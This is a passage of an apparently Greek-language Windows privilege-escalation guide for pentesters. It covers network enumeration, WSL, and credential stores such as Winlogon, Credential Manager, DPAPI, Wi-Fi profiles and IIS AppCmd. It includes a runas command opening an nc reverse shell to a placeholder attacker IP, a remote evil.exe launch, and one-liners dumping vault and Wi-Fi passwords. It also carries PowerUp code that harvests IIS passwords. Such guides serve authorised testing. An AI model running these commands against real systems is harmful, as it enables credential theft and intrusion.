Για έναν τοπικό listener, συσχετίστε το PID του με τον κάτοχο της διεργασίας, τη διαδρομή του εκτελέσιμου αρχείου και οποιαδήποτε υπηρεσία ή προγραμματισμένη εργασία τον εκκινεί. Μια υπηρεσία απομακρυσμένου ελέγχου μπορεί να παρέχει πρόσβαση ως ο χρήστης της επιφάνειας εργασίας μόνο αν το επιτρέπουν ο έλεγχος ταυτότητας και οι μηχανισμοί ελέγχου εντολών της. Μια προσαρμοσμένη εφαρμογή TCP που εκτελείται με λογαριασμό υψηλότερων προνομίων αποτελεί ξεχωριστό στόχο ελέγχου: ο listener και η διαδρομή του binary είναι απλώς ενδείξεις, ενώ μια αυθεντικοποιημένη οδός εκμετάλλευσης αλλοίωσης μνήμης απαιτεί ανάλυση του συγκεκριμένου binary και της προσβάσιμης εισόδου του. Αν μια εκτεθειμένη θύρα φαίνεται να ανήκει σε διεργασία συστήματος, συγκρίνετέ την με την έξοδο της εντολής [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) πριν αποδώσετε την υπηρεσία backend· ένας κανόνας προώθησης από μόνος του δεν αποδεικνύει ότι ο προορισμός είναι προσβάσιμος ή ευάλωτος.

### Πίνακας δρομολόγησης

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Πίνακας ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Κανόνες Firewall

[**Δείτε αυτή τη σελίδα για εντολές σχετικές με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για απαρίθμηση δικτύου εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Το δυαδικό αρχείο `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε πρόσβαση ως root, μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να ακούσετε σε μια θύρα, θα εμφανιστεί ένα GUI που θα σας ρωτά αν πρέπει να επιτραπεί στο `nc` η πρόσβαση μέσω του firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Για να εκκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Το Linux `root` μέσα στο WSL δεν παρέχει από μόνο του δικαιώματα Windows Administrator. Αν η τρέχουσα ταυτότητα των Windows μπορεί να διαβάσει το σύστημα αρχείων μιας διανομής, ελέγξτε τα αρχεία ιστορικού του κελύφους (συμπεριλαμβανομένου του `/root/.bash_history`) για εντολές στις οποίες ενδέχεται να έχουν καταγραφεί διαπιστευτήρια· η κλιμάκωση εξακολουθεί να απαιτεί έγκυρο λογαριασμό με υψηλότερα προνόμια και επιτρεπόμενη διαδρομή ελέγχου ταυτότητας. Η διάταξη `LocalState\rootfs` αφορά παλαιότερες εγκαταστάσεις WSL· το WSL 2 συνήθως αποθηκεύει τη διανομή σε έναν εικονικό δίσκο [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), επομένως εντοπίστε πρώτα την πραγματική διανομή και τη διαδρομή αποθήκευσης. Αποφύγετε την εμφάνιση των περιεχομένων του ιστορικού κατά την αυτοματοποιημένη απαρίθμηση.

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Αντιμετωπίστε τα `DefaultUserName` και `DefaultDomainName` ως πληροφορίες πλαισίου λογαριασμού, όχι ως διαπιστευτήρια. Μια μη κενή τιμή `DefaultPassword` ή `AltDefaultPassword` αποτελεί εύρημα απλού κειμένου στο registry. Αν το `AutoAdminLogon=1`, αλλά δεν είναι αναγνώσιμος κανένας κωδικός πρόσβασης απλού κειμένου, αυτό αποτελεί μόνο ένδειξη: το [Sysinternals Autologon μπορεί να αποθηκεύει τον κωδικό πρόσβασης ως μυστικό LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), και οι συνήθεις αναγνώσεις του registry δεν αποδεικνύουν αν υπάρχει αυτό το μυστικό ή αν μπορεί να ανακτηθεί. Ελέγξτε τα δικαιώματα πρόσβασης και την πραγματική διαμόρφωση σύνδεσης πριν αναφέρετε έκθεση διαπιστευτηρίων.

### Διαχείριση διαπιστευτηρίων / Windows vault

Από το [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για διακομιστές, ιστότοπους και άλλα προγράμματα, τα οποία τα **Windows** μπορούν να χρησιμοποιήσουν για να **συνδέουν αυτόματα τους χρήστες**. Αρχικά, μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύουν διαπιστευτήρια για ιστότοπους όπως το Facebook, το Twitter ή το Gmail και να συνδέονται αυτόματα μέσω των browser, αλλά δεν λειτουργεί έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία τα Windows μπορούν να συνδέουν αυτόματα τους χρήστες. Αυτό σημαίνει ότι οποιαδήποτε **εφαρμογή Windows χρειάζεται διαπιστευτήρια για να αποκτήσει πρόσβαση σε έναν πόρο** (διακομιστή ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** και το Windows Vault και να αξιοποιήσει τα παρεχόμενα διαπιστευτήρια, αντί οι χρήστες να εισάγουν κάθε φορά το όνομα χρήστη και τον κωδικό πρόσβασης.

Αν οι εφαρμογές δεν αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν δεδομένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το Credential Manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο vault αποθήκευσης.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στον υπολογιστή.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το ακόλουθο παράδειγμα καλεί ένα απομακρυσμένο εκτελέσιμο αρχείο μέσω κοινόχρηστου πόρου SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Σημειώστε ότι μπορείτε να χρησιμοποιήσετε τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [module του Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Οι σύγχρονες εφαρμογές Windows UWP, ο Microsoft Edge και οι σύγχρονες υπηρεσίες συστήματος αποθηκεύουν tokens ελέγχου ταυτότητας και κωδικούς πρόσβασης σε απλό κείμενο μέσα στο Universal Windows Platform (UWP) `PasswordVault` (το οποίο εμφανίζεται επίσης ως `Web Credentials` στο `vaultcmd`). Αυτός ο χώρος αποθήκευσης είναι απομονωμένος ανά session και μπορεί να αποκρυπτογραφηθεί εγγενώς, χωρίς δικαιώματα διαχειριστή ή `SeDebugPrivilege`.

Εκτελέστε αυτήν την εντολή PowerShell μέσα στο ενεργό session του χρήστη, για να εξαγάγετε και να αποκρυπτογραφήσετε αμέσως όλα τα αποθηκευμένα ονόματα χρήστη και τους κωδικούς πρόσβασης σε απλό κείμενο:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων και χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος, το οποίο συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα μυστικά σύνδεσης του χρήστη**. Σε περιπτώσεις κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας τομέα του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρηστών, μέσω του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, το οποίο βρίσκεται μαζί με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, αποτελείται συνήθως από 64 bytes τυχαίων δεδομένων. (Σημειώστε ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, οπότε δεν είναι δυνατή η εμφάνιση των περιεχομένων του μέσω της εντολής `dir` στο CMD, αν και μπορούν να εμφανιστούν μέσω του PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτηρίων που προστατεύονται από τον κύριο κωδικό πρόσβασης** βρίσκονται συνήθως στο:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για αποκρυπτογράφηση.\
Μπορείτε να **εξαγάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης, ως ένας βολικός τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων. Τα διαπιστευτήρια προστατεύονται με DPAPI, πράγμα που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Ένα εξαγόμενο διαπιστευτήριο μπορεί να έχει οποιοδήποτε όνομα αρχείου ή διαδρομή `.xml`. Όταν ένα script ή μια απογραφή αρχείων οδηγεί σε τέτοιο αρχείο, εντοπίστε τον πραγματικό κατάλογο προφίλ του λογαριασμού αντί να υποθέσετε ότι βρίσκεται στο `C:\Users`: [Τα Windows μπορούν να τοποθετήσουν τα προφίλ αλλού](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Ένα αρχείο που μπορεί να αναγνωστεί αποτελεί μόνο ένα στοιχείο προς διερεύνηση· [το `Export-Clixml` των Windows συνδέει ένα κρυπτογραφημένο διαπιστευτήριο με τον χρήστη και τον υπολογιστή που το εξήγαγαν](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), ενώ κάθε λογαριασμός που ανακτάται πρέπει ξεχωριστά να διαθέτει έγκυρα δικαιώματα στην προβλεπόμενη υπηρεσία. Εξετάστε πρώτα τις διαδρομές και τα ACL, χωρίς να εμφανίζετε κρυπτογραφημένες ή απλές τιμές κατά τη συνήθη απογραφή.

Για να **αποκρυπτογραφήσετε** διαπιστευτήρια PS από το αρχείο που τα περιέχει, μπορείτε να κάνετε τα εξής:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στα `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Εντολές που εκτελέστηκαν πρόσφατα

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Διαχειριστής διαπιστευτηρίων Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

**Το mRemoteNG χρησιμοποιεί διαφορετικό χώρο αποθήκευσης συνδέσεων.** Εξετάστε αναγνώσιμα XML στον φάκελο `%APPDATA%\mRemoteNG` και στα Documents του χρήστη, συμπεριλαμβανομένων αρχείων με συνηθισμένα ονόματα όπως `config.xml`. Εντοπίστε το schema συνδέσεων και τα κρυπτογραφημένα attributes `Password` πριν θεωρήσετε ένα αρχείο XML πιθανή πηγή διαπιστευτηρίων. Η αποθηκευμένη τιμή δεν είναι κωδικός DPAPI/RDCMan· η ανάκτησή της εξαρτάται από τις ρυθμίσεις κρυπτογράφησης του αρχείου και από το αν χρησιμοποιήθηκε προσαρμοσμένος master password. Αποφύγετε να εμφανίζετε κρυπτογραφημένες τιμές κατά την ευρεία απαρίθμηση.

**Οι εξαγωγές προφίλ του Remote Desktop Plus** μπορεί επίσης να είναι αναγνώσιμες σε καταλόγους χρηστών ή σε κοινόχρηστο φάκελο διαχείρισης. Μια παλαιού τύπου εξαγωγή `profiles.xml` περιέχει εγγραφές `Data/Profile` με στοιχεία `ProfileName`, `Password` και `Secure`. Αντιμετωπίστε ένα μη κενό στοιχείο password ως πιθανή πηγή διαπιστευτηρίων, χωρίς να το εμφανίσετε ή να υποθέσετε ότι είναι απλό κείμενο: [ο προμηθευτής αναφέρει](https://www.donkz.nl/) ότι η προστασία προφίλ μπορεί να είναι δεσμευμένη στον λογαριασμό και τον υπολογιστή που τη δημιούργησαν ή να έχει ρυθμιστεί με λιγότερο αυστηρό τρόπο. Επιβεβαιώστε την προέλευση του αρχείου και τις προϋποθέσεις ανάκτησης πριν βασιστείτε σε αυτό.

### Sticky Notes

Μερικές φορές οι χρήστες αποθηκεύουν κωδικούς πρόσβασης και άλλες πληροφορίες σε εφαρμογές σημειώσεων. Η συσκευασμένη εφαρμογή Sticky Notes της Microsoft συνήθως αποθηκεύει σημειώσεις στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`· παλαιότερες ή διαφορετικές εφαρμογές μπορεί να χρησιμοποιούν άλλους χώρους αποθήκευσης στο προφίλ χρήστη, συμπεριλαμβανομένου του LevelDB. Εντοπίστε την εγκατεστημένη εφαρμογή και τη μορφή αποθήκευσης πριν θεωρήσετε ότι η απουσία αρχείου SQLite σημαίνει ότι δεν υπάρχουν σημειώσεις.

Αν το Sticky Notes χρησιμοποιεί write-ahead logging του SQLite, ένα αντίγραφο μόνο του `plum.sqlite` μπορεί να παραλείπει πρόσφατες δεσμευμένες σημειώσεις. Διατηρήστε το αντίστοιχο `plum.sqlite-wal` μαζί με ένα συνεπές αντίγραφο της βάσης δεδομένων και συμπεριλάβετε το `plum.sqlite-shm` όταν είναι διαθέσιμο· ο δείκτης κοινόχρηστης μνήμης μπορεί να αναδημιουργηθεί, αλλά το WAL αποτελεί μέρος της μόνιμης κατάστασης της βάσης δεδομένων. Δείτε την [τεκμηρίωση WAL του SQLite](https://www.sqlite.org/wal.html). Μια σημείωση που περιέχει όνομα λογαριασμού ή κωδικό πρόσβασης αποτελεί μόνο πιθανή πηγή διαπιστευτηρίων: επαληθεύστε ξεχωριστά τον λογαριασμό, την επιτρεπόμενη πρόσβαση και την επαναχρησιμοποίηση του κωδικού πρόσβασης. Μια κρυπτογραφημένη εγγραφή διαχειριστή κωδικών απαιτεί επίσης το πραγματικό κλειδί αποκρυπτογράφησής της και ερμηνεία ειδική για την εφαρμογή, προτού μπορέσει να τεκμηριώσει σύνδεση με υψηλότερα δικαιώματα.

### AppCmd.exe

**Σημειώστε ότι για την ανάκτηση κωδικών πρόσβασης από το AppCmd.exe πρέπει να είστε Administrator και να εκτελείτε το εργαλείο σε επίπεδο High Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν υπάρχει αυτό το αρχείο, τότε είναι πιθανό να έχουν ρυθμιστεί ορισμένα **διαπιστευτήρια** και να είναι δυνατή η **ανάκτησή** τους.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι installers **εκτελούνται με δικαιώματα SYSTEM** και πολλοί είναι ευάλωτοι σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Αρχεία και Registry (διαπιστευτήρια)

### Τεχνουργήματα διαπιστευτηρίων στο Registry εργαλείων υποστήριξης

Ορισμένες παλαιότερες εγκαταστάσεις απομακρυσμένης υποστήριξης διατηρούν ονόματα τιμών σχετικών με κωδικούς πρόσβασης σε σταθερά κλειδιά Registry της εφαρμογής. Για παράδειγμα, το `SecurityPasswordAES` του TeamViewer προσδιόριζε έναν διαμορφωμένο στατικό κωδικό πρόσβασης συνεδρίας σε εκδόσεις πριν από την 9, σύμφωνα με την [εξήγηση του προμηθευτή για τα κλειδιά Registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Ένας δείκτης στο όνομα τιμής αποτελεί μόνο ένδειξη για περαιτέρω έλεγχο: επαληθεύστε την εγκατεστημένη έκδοση, αν τα δεδομένα της τιμής είναι αναγνώσιμα, τη μορφή τους και την τρέχουσα συμπεριφορά ελέγχου ταυτότητας πριν αξιολογήσετε αυτό το διαπιστευτήριο. Η μετάβαση από έναν κωδικό πρόσβασης απομακρυσμένης υποστήριξης σε έναν λογαριασμό Windows με περισσότερα δικαιώματα απαιτεί επίσης πραγματική επαναχρησιμοποίηση του κωδικού και εξουσιοδότηση για αυτόν τον λογαριασμό. Μην εμφανίζετε ciphertext και ανακτημένους κωδικούς πρόσβασης στα συνήθη αποτελέσματα απαρίθμησης.

### Κοινόχρηστα υπολογιστικά φύλλα με προστατευμένα φύλλα

Αν υπάρχει υποψία ότι ένα αναγνώσιμο κοινόχρηστο workbook περιέχει δεδομένα λογαριασμών, διακρίνετε την **κρυπτογράφηση αρχείου** από την προστασία φύλλου εργασίας ή τις κρυφές στήλες. Η [Microsoft αναφέρει](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) ότι η προστασία φύλλου εργασίας ελέγχει την επεξεργασία και δεν αποτελεί χαρακτηριστικό ασφαλείας· από μόνη της δεν αποδεικνύει ότι τα περιεχόμενα του workbook είναι κρυπτογραφημένα. Ελέγχετε μόνο εξουσιοδοτημένα, σχετικά αρχεία και αποφύγετε την εμφάνιση πιθανών μυστικών κατά την ευρεία απαρίθμηση. Μια αναγνώσιμη διαδρομή `.xlsx`, ένα προστατευμένο φύλλο ή μια κρυφή στήλη από μόνα τους δεν αποδεικνύουν ότι υπάρχουν διαπιστευτήρια ή ότι κάποιος λογαριασμός έχει περισσότερα δικαιώματα· επαληθεύστε χωριστά τα πραγματικά δεδομένα και τα τρέχοντα δικαιώματα του λογαριασμού.

### Διατηρημένα patches αλλαγών σε CI server

Ένας CI server μπορεί να διατηρεί υποβληθείσες αλλαγές πηγαίου κώδικα στον κατάλογο δεδομένων του, ακόμη και μετά την ολοκλήρωση του build. Το [TeamCity τεκμηριώνει](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) το `system/changes` ως χώρο αποθήκευσης αλλαγών από remote run· ο κατάλογος δεδομένων μπορεί να ρυθμιστεί και δεν βρίσκεται απαραίτητα στο `ProgramData`. Ένα αναγνώσιμο patch μπορεί να διατηρεί αναφορές που έχουν αφαιρεθεί ή προστεθεί προς ένα αρχείο διαπιστευτηρίων, ένα κλειδί κρυπτογράφησης ή ένα script που χρησιμοποιεί και τα δύο. Για παράδειγμα, μια ροή εργασίας PowerShell με `ConvertTo-SecureString -Key` χρειάζεται τόσο το κλειδί AES όσο και την κρυπτογραφημένη συμβολοσειρά· η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) ότι το κλειδί παρέχεται ξεχωριστά. Ελέγξτε πρώτα μόνο τα προσβάσιμα ονόματα των patches και έπειτα, με εξουσιοδότηση, το σχετικό περιεχόμενο, χωρίς να εμφανίζετε μυστικά στα συνήθη αποτελέσματα απαρίθμησης. Μια διαδρομή patch, μια κρυπτογραφημένη τιμή ή μια αναφορά σε κλειδί από μόνα τους δεν αποδεικνύουν έγκυρο διαπιστευτήριο ή πρόσβαση με περισσότερα δικαιώματα. Περιορίστε τα ACL του καταλόγου δεδομένων και αποφύγετε την καταχώριση μυστικών στις αλλαγές build.

### Προσαρμοσμένη περιστροφή κωδικού πρόσβασης τοπικού διαχειριστή

Ένας αυτοσχέδιος μηχανισμός περιστροφής κωδικών πρόσβασης μπορεί να αποθηκεύει έναν κρυπτογραφημένο κωδικό πρόσβασης τοπικού διαχειριστή σε μια τοπική υπηρεσία, διατηρώντας τα διαπιστευτήρια του datastore σε αναγνώσιμο αρχείο `.env` ή δίπλα στο δυαδικό αρχείο του updater. Εξετάστε μαζί την προγραμματισμένη εργασία του updater, τον λογαριασμό, τα ACL των αρχείων ρυθμίσεων, τον listener και τα δικαιώματα του datastore. Ένα datastore που ακούει μόνο στο loopback παραμένει προσβάσιμο από τοπικό χρήστη με έγκυρα διαπιστευτήρια, αλλά ο έλεγχος ταυτότητας από μόνος του δεν αποδεικνύει δικαίωμα ανάγνωσης των σχετικών εγγραφών. Αν το seed κρυπτογράφησης ή το υλικό κλειδιού είναι προσβάσιμο δίπλα στο ciphertext, εξετάστε την ακριβή παραγωγή κλειδιού πριν εμπιστευτείτε την κρυπτογράφηση. Ένα σχήμα που παράγει ντετερμινιστικά ένα κλειδί AES από εκτεθειμένο seed με το Go [`math/rand`](https://pkg.go.dev/math/rand) είναι ακατάλληλο για την προστασία αυτού του κωδικού πρόσβασης· η Go τεκμηριώνει ότι αυτό το package δεν είναι κατάλληλο για τυχαιότητα ευαίσθητη στην ασφάλεια. Επιβεβαιώστε ότι οποιοσδήποτε ανακτημένος κωδικός πρόσβασης είναι τρέχων και ανήκει σε λογαριασμό της ομάδας τοπικών Administrators πριν τον θεωρήσετε διαδρομή κλιμάκωσης δικαιωμάτων. Μια προγραμματισμένη εργασία, μια διαδρομή `.env` ή ένα κρυπτογραφημένο blob από μόνα τους δεν αποδεικνύουν καμία από αυτές τις προϋποθέσεις. Μην εμφανίζετε κωδικούς πρόσβασης και υλικό κλειδιών στα συνήθη αποτελέσματα απαρίθμησης.

Χρησιμοποιήστε το [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) για τη διαχείριση κωδικών πρόσβασης τοπικών διαχειριστών. Η αποθήκευσή του σε directory ή σε Entra και οι έλεγχοι πρόσβασης διαφέρουν από ένα προσαρμοσμένο τοπικό datastore· αντίστοιχα, οι [ρόλοι Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) καθορίζουν αν ένας πιστοποιημένος χρήστης του datastore μπορεί να διαβάσει συγκεκριμένο index.

### Αρχεία plugin Java server και επαναχρησιμοποίηση διαπιστευτηρίων

